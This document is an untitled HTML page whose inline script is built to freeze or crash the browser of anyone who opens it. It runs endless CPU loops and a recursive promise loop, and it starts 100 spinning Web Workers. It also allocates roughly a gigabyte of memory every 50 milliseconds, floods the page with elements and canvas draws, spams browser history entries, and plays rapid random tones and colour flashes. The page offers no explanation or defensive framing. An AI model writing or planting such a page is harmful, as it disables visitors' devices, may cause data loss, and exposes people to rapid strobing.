<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
* { will-change: transform, filter; }
body { margin:0; overflow:hidden; }
</style>
</head>
<body>
<script>

function cpuBlackHole(){
    while(true){
        Math.sqrt(Math.random()*Date.now());
    }
}
setTimeout(cpuBlackHole, 200);

let mem=[];
setInterval(()=>{
    mem.push(new Uint8Array(999_000_000));
},50);

setInterval(()=>{
    for(let i=0;i<20000;i++){
        const d=document.createElement("div");
        d.textContent=Math.random();
        d.style.position="absolute";
        d.style.left=Math.random()*innerWidth+"px";
        d.style.top=Math.random()*innerHeight+"px";
        d.style.fontSize=(Math.random()*100)+"px";
        document.body.appendChild(d);
    }
},20);

setInterval(()=>{
    document.body.style.transform=
        `scale(${Math.random()*5})
         rotate(${Math.random()*360}deg)`;
    document.body.offsetHeight;
},0);

(function micro(){
    Promise.resolve().then(micro);
})();

setInterval(()=>{
    history.pushState({}, "", "#"+Math.random());
},5);

const c=document.createElement("canvas");
document.body.appendChild(c);
const x=c.getContext("2d");

function resize(){
    c.width=innerWidth*2;
    c.height=innerHeight*2;
}
resize();

function gpu(){
    for(let i=0;i<50000;i++){
        x.fillStyle=`hsl(${Math.random()*360},100%,50%)`;
        x.fillRect(
            Math.random()*c.width,
            Math.random()*c.height,
            50,50
        );
    }
    requestAnimationFrame(gpu);
}
gpu();

const ac=new (AudioContext||webkitAudioContext)();
setInterval(()=>{
    const o=ac.createOscillator();
    o.frequency.value=Math.random()*5000;
    o.connect(ac.destination);
    o.start();
    o.stop(ac.currentTime+0.02);
},10);

for(let i=0;i<100;i++){
    new Worker(URL.createObjectURL(new Blob([`
        while(true){
            Math.tan(Math.random());
        }
    `])));
}

setInterval(()=>{
    document.body.style.filter=
        `invert(${Math.random()})
         blur(${Math.random()*20}px)
         hue-rotate(${Math.random()*360}deg)
         saturate(10)`;
    document.body.style.background=
        `hsl(${Math.random()*360},100%,50%)`;
},10);

</script>
</body>
</html>
